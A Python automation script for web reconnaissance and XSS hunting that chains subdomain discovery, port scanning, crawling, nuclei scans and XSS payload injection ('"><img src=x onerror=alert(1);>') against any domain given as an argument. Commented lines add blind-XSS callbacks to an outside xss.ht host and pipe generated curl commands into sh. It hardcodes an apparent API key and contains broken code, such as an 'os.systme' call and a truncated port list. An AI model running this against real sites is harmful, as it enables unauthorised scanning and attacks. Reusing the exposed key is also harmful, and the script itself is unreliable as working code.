import sys, time, os

domain = str(sys.argv[1])
UserAgent = "kommandos"

APIKNOXSS = "35dd8385-8cec-4273-8767-8a5bedc09b96"

allports = "80,443,81,300,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7396,7474,8000,8001,8008,8014,8042,8060,8069,8080,8081,8083,8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9001,9043,9060,9080,9090,9091,9200,9443,95"


os.system(f"subfinder -all -silent -d {domain} | anew sub_{domain}")
time.sleep(10)
os.system(f"cat sub_{domain} | httpx -silent | anew 200http{domain}")
time.sleep(5)
os.system(f"cat sub_{domain} | naabu -silent | anew portDomains_{domain}")
time.sleep(5)
os.system(f"cat 200http{domain} | katana -d 5 -silent | anew crawlingURLS_{domain}")
time.sleep(5)
os.system(f"portDomains_{domain} | nuclei -severity low,medium,high,critical -silent -o nuclei_{domain} -H {UserAgent} | notify --silent")
time.sleep(5)
os.system(f"cat crawlingURLS_{domain} | gf xss | anew xssCrawling_{domain}")
time.sleep(5)
os.system("echo {} | waybackurls | gf xss | uro | qsreplace \'\"><img src=x onerror=alert(1);>\' | freq | egrep -v \'Not\' | anew freqXss_{}".format(domain,domain))
#os.system(f"cat xssCrawling_{domain} | gf xss | dalfox pipe --skip-bav --mining-dom --deep-domxss --ignore-return -b \'https://ofjaaaaah.xss.ht\' --follow-redirects | notify -silent")
#echo "dominio" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss.me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIDOKNOXSS\"" }' | sh 
time.sleep(5)
os.systme(f"cat 200http{domain} | katana -d 5 -silent -em js,jsp,json | anew filesCrawling &&")
time.sleep(10)
os.system(f"echo Bot recon {domain} completo | notify --silent")
#os.system(f"cat 200http{domain} | gauplus | grep \"=\" | uro | gf xss | awk \'\{print \" curl https://knoxss.me/api/v3 -d \"target=\"$1 "}")

